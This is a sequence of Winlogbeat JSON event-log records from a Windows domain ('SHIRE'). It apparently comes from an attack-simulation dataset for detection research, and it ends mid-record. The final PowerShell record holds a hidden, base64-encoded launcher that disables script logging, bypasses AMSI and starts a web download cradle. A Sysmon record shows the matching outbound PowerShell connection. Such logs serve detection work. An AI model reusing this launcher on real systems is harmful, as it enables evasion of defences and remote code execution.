{"@timestamp":"2019-05-18T20:43:15.176Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"process_id":4,"message":"A token right was adjusted.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nTarget Account:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nProcess Information:\n\tProcess ID:\t\t0x2d0\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe\n\nEnabled Privileges:\n\t\t\tSeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege\n\nDisabled Privileges:\n\t\t\t-","task":"Token Right Adjusted Events","opcode":"Info","thread_id":3584,"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"host":{"name":"WECserver"},"keywords":["Audit Success"],"log_name":"Security","source_name":"Microsoft-Windows-Security-Auditing","computer_name":"HFDC01.shire.com","level":"Information","record_number":"12283300","event_id":4703,"type":"wineventlog","provider_guid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","event_data":{"TargetUserName":"HFDC01$","TargetLogonId":"0x3e7","ProcessName":"C:\\Windows\\System32\\svchost.exe","SubjectUserName":"HFDC01$","SubjectDomainName":"SHIRE","SubjectLogonId":"0x3e7","DisabledPrivilegeList":"-","TargetUserSid":"S-1-0-0","SubjectUserSid":"S-1-5-18","TargetDomainName":"SHIRE","ProcessId":"0x2d0","EnabledPrivilegeList":"SeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege"}}
{"@timestamp":"2019-05-18T20:43:15.176Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"process_id":4,"message":"A token right was adjusted.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nTarget Account:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nProcess Information:\n\tProcess ID:\t\t0x2d0\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe\n\nEnabled Privileges:\n\t\t\tSeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege\n\nDisabled Privileges:\n\t\t\t-","opcode":"Info","computer_name":"HFDC01.shire.com","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"provider_guid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","level":"Information","event_data":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"HFDC01$","TargetUserSid":"S-1-0-0","ProcessName":"C:\\Windows\\System32\\svchost.exe","TargetLogonId":"0x3e7","DisabledPrivilegeList":"-","SubjectLogonId":"0x3e7","TargetDomainName":"SHIRE","ProcessId":"0x2d0","EnabledPrivilegeList":"SeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege","SubjectDomainName":"SHIRE","TargetUserName":"HFDC01$"},"source_name":"Microsoft-Windows-Security-Auditing","record_number":"12283301","event_id":4703,"task":"Token Right Adjusted Events","host":{"name":"WECserver"},"type":"wineventlog","log_name":"Security","thread_id":3584,"keywords":["Audit Success"]}
{"@timestamp":"2019-05-18T20:43:15.176Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"record_number":"12283302","type":"wineventlog","log_name":"Security","keywords":["Audit Success"],"computer_name":"HFDC01.shire.com","message":"A token right was adjusted.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nTarget Account:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nProcess Information:\n\tProcess ID:\t\t0x2d0\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe\n\nEnabled Privileges:\n\t\t\tSeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege\n\nDisabled Privileges:\n\t\t\t-","task":"Token Right Adjusted Events","thread_id":3584,"source_name":"Microsoft-Windows-Security-Auditing","level":"Information","opcode":"Info","process_id":4,"event_data":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"HFDC01$","SubjectLogonId":"0x3e7","TargetUserName":"HFDC01$","TargetUserSid":"S-1-0-0","ProcessName":"C:\\Windows\\System32\\svchost.exe","EnabledPrivilegeList":"SeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege","TargetLogonId":"0x3e7","ProcessId":"0x2d0","SubjectDomainName":"SHIRE","TargetDomainName":"SHIRE","DisabledPrivilegeList":"-"},"event_id":4703,"provider_guid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","beat":{"hostname":"WECserver","version":"6.7.0","name":"WECserver"},"host":{"name":"WECserver"}}
{"@timestamp":"2019-05-18T20:43:15.177Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"event_data":{"TargetLogonId":"0x3e7","TargetUserSid":"S-1-0-0","TargetUserName":"HFDC01$","ProcessId":"0x2d0","SubjectUserSid":"S-1-5-18","ProcessName":"C:\\Windows\\System32\\svchost.exe","EnabledPrivilegeList":"SeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege","SubjectUserName":"HFDC01$","SubjectDomainName":"SHIRE","SubjectLogonId":"0x3e7","TargetDomainName":"SHIRE","DisabledPrivilegeList":"-"},"type":"wineventlog","source_name":"Microsoft-Windows-Security-Auditing","process_id":4,"thread_id":3584,"message":"A token right was adjusted.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nTarget Account:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nProcess Information:\n\tProcess ID:\t\t0x2d0\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe\n\nEnabled Privileges:\n\t\t\tSeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege\n\nDisabled Privileges:\n\t\t\t-","level":"Information","opcode":"Info","record_number":"12283303","computer_name":"HFDC01.shire.com","keywords":["Audit Success"],"log_name":"Security","provider_guid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"host":{"name":"WECserver"},"event_id":4703,"task":"Token Right Adjusted Events"}
{"@timestamp":"2019-05-18T20:43:15.190Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"host":{"name":"WECserver"},"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"event_id":4703,"provider_guid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","message":"A token right was adjusted.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nTarget Account:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nProcess Information:\n\tProcess ID:\t\t0x2d0\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe\n\nEnabled Privileges:\n\t\t\tSeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege\n\nDisabled Privileges:\n\t\t\t-","event_data":{"SubjectUserName":"HFDC01$","TargetUserName":"HFDC01$","TargetLogonId":"0x3e7","EnabledPrivilegeList":"SeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege","SubjectUserSid":"S-1-5-18","TargetUserSid":"S-1-0-0","DisabledPrivilegeList":"-","TargetDomainName":"SHIRE","ProcessName":"C:\\Windows\\System32\\svchost.exe","ProcessId":"0x2d0","SubjectDomainName":"SHIRE","SubjectLogonId":"0x3e7"},"type":"wineventlog","task":"Token Right Adjusted Events","computer_name":"HFDC01.shire.com","process_id":4,"level":"Information","source_name":"Microsoft-Windows-Security-Auditing","keywords":["Audit Success"],"log_name":"Security","record_number":"12283304","thread_id":3584,"opcode":"Info"}
{"@timestamp":"2019-05-18T20:43:15.190Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"message":"A token right was adjusted.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nTarget Account:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nProcess Information:\n\tProcess ID:\t\t0x2d0\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe\n\nEnabled Privileges:\n\t\t\tSeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege\n\nDisabled Privileges:\n\t\t\t-","event_data":{"ProcessName":"C:\\Windows\\System32\\svchost.exe","TargetDomainName":"SHIRE","TargetLogonId":"0x3e7","EnabledPrivilegeList":"SeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege","SubjectLogonId":"0x3e7","TargetUserSid":"S-1-0-0","ProcessId":"0x2d0","DisabledPrivilegeList":"-","SubjectUserSid":"S-1-5-18","SubjectUserName":"HFDC01$","SubjectDomainName":"SHIRE","TargetUserName":"HFDC01$"},"source_name":"Microsoft-Windows-Security-Auditing","opcode":"Info","type":"wineventlog","computer_name":"HFDC01.shire.com","provider_guid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","record_number":"12283305","keywords":["Audit Success"],"thread_id":3584,"log_name":"Security","process_id":4,"event_id":4703,"task":"Token Right Adjusted Events","beat":{"version":"6.7.0","name":"WECserver","hostname":"WECserver"},"host":{"name":"WECserver"},"level":"Information"}
{"@timestamp":"2019-05-18T20:43:15.190Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"type":"wineventlog","provider_guid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","message":"A token right was adjusted.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nTarget Account:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nProcess Information:\n\tProcess ID:\t\t0x2d0\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe\n\nEnabled Privileges:\n\t\t\tSeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege\n\nDisabled Privileges:\n\t\t\t-","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"log_name":"Security","record_number":"12283306","level":"Information","task":"Token Right Adjusted Events","process_id":4,"opcode":"Info","event_data":{"TargetLogonId":"0x3e7","ProcessName":"C:\\Windows\\System32\\svchost.exe","ProcessId":"0x2d0","SubjectDomainName":"SHIRE","EnabledPrivilegeList":"SeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege","DisabledPrivilegeList":"-","TargetUserName":"HFDC01$","TargetDomainName":"SHIRE","SubjectUserSid":"S-1-5-18","SubjectUserName":"HFDC01$","TargetUserSid":"S-1-0-0","SubjectLogonId":"0x3e7"},"thread_id":3584,"host":{"name":"WECserver"},"computer_name":"HFDC01.shire.com","source_name":"Microsoft-Windows-Security-Auditing","keywords":["Audit Success"],"event_id":4703}
{"@timestamp":"2019-05-18T20:43:15.191Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"event_id":4703,"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"computer_name":"HFDC01.shire.com","source_name":"Microsoft-Windows-Security-Auditing","provider_guid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","keywords":["Audit Success"],"host":{"name":"WECserver"},"message":"A token right was adjusted.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nTarget Account:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nProcess Information:\n\tProcess ID:\t\t0x2d0\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe\n\nEnabled Privileges:\n\t\t\tSeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege\n\nDisabled Privileges:\n\t\t\t-","log_name":"Security","record_number":"12283307","opcode":"Info","process_id":4,"type":"wineventlog","task":"Token Right Adjusted Events","thread_id":3584,"level":"Information","event_data":{"EnabledPrivilegeList":"SeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege","SubjectDomainName":"SHIRE","DisabledPrivilegeList":"-","SubjectUserName":"HFDC01$","TargetDomainName":"SHIRE","ProcessName":"C:\\Windows\\System32\\svchost.exe","SubjectUserSid":"S-1-5-18","SubjectLogonId":"0x3e7","TargetUserSid":"S-1-0-0","TargetUserName":"HFDC01$","TargetLogonId":"0x3e7","ProcessId":"0x2d0"}}
{"@timestamp":"2019-05-18T20:43:15.363Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"type":"wineventlog","log_name":"Microsoft-Windows-Sysmon/Operational","event_data":{"SourceIp":"172.18.39.106","DestinationPort":"443","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Protocol":"tcp","SourceIsIpv6":"false","DestinationIp":"10.0.10.106","DestinationIsIpv6":"false","User":"SHIRE\\nmartha","UtcTime":"2019-05-07 11:56:32.199","ProcessId":"5452","Initiated":"true","DestinationPortName":"https","SourcePort":"53377","ProcessGuid":"{03ba39f5-50b2-5ce0-0000-00109995c501}","SourceHostname":"HR001.shire.com"},"computer_name":"HR001.shire.com","process_id":2440,"beat":{"hostname":"WECserver","version":"6.7.0","name":"WECserver"},"opcode":"Info","message":"Network connection detected:\nRuleName: \nUtcTime: 2019-05-07 11:56:32.199\nProcessGuid: {03ba39f5-50b2-5ce0-0000-00109995c501}\nProcessId: 5452\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nUser: SHIRE\\nmartha\nProtocol: tcp\nInitiated: true\nSourceIsIpv6: false\nSourceIp: 172.18.39.106\nSourceHostname: HR001.shire.com\nSourcePort: 53377\nSourcePortName: \nDestinationIsIpv6: false\nDestinationIp: 10.0.10.106\nDestinationHostname: \nDestinationPort: 443\nDestinationPortName: https","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","version":5,"task":"Network connection detected (rule: NetworkConnect)","host":{"name":"WECserver"},"event_id":3,"thread_id":2368,"user":{"domain":"NT AUTHORITY","type":"User","identifier":"S-1-5-18","name":"SYSTEM"},"level":"Information","record_number":"2237810","source_name":"Microsoft-Windows-Sysmon"}
{"@timestamp":"2019-05-18T20:43:16.302Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"opcode":"Info","message":"The Windows Filtering Platform has permitted a connection.\n\nApplication Information:\n\tProcess ID:\t\t3476\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\svchost.exe\n\nNetwork Information:\n\tDirection:\t\tOutbound\n\tSource Address:\t\t172.18.39.106\n\tSource Port:\t\t53378\n\tDestination Address:\t172.18.39.102\n\tDestination Port:\t\t5985\n\tProtocol:\t\t6\n\nFilter Information:\n\tFilter Run-Time ID:\t67557\n\tLayer Name:\t\tConnect\n\tLayer Run-Time ID:\t48","log_name":"Security","source_name":"Microsoft-Windows-Security-Auditing","host":{"name":"WECserver"},"type":"wineventlog","level":"Information","task":"Filtering Platform Connection","keywords":["Audit Success"],"thread_id":1288,"event_data":{"Protocol":"6","LayerRTID":"48","Application":"\\device\\harddiskvolume2\\windows\\system32\\svchost.exe","RemoteUserID":"S-1-0-0","SourceAddress":"172.18.39.106","SourcePort":"53378","DestAddress":"172.18.39.102","DestPort":"5985","RemoteMachineID":"S-1-0-0","ProcessID":"3476","Direction":"%%14593","LayerName":"%%14611","FilterRTID":"67557"},"record_number":"288261","process_id":4,"event_id":5156,"provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","version":1,"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"computer_name":"HR001.shire.com"}
{"@timestamp":"2019-05-18T20:43:18.284Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"event_id":800,"type":"wineventlog","task":"Pipeline Execution Details","opcode":"Info","keywords":["Classic"],"source_name":"PowerShell","record_number":"101825","beat":{"version":"6.7.0","name":"WECserver","hostname":"WECserver"},"host":{"name":"WECserver"},"computer_name":"HR001.shire.com","level":"Information","log_name":"Windows PowerShell","message":"Pipeline execution details for command line:             Start-Sleep -Seconds $sleepTime;\n. \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=69926\n\n\tUserId=SHIRE\\nmartha\n\tHostName=ConsoleHost\n\tHostVersion=5.1.17763.316\n\tHostId=9189b674-b66f-4ae4-af64-65d46d4e78e4\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAG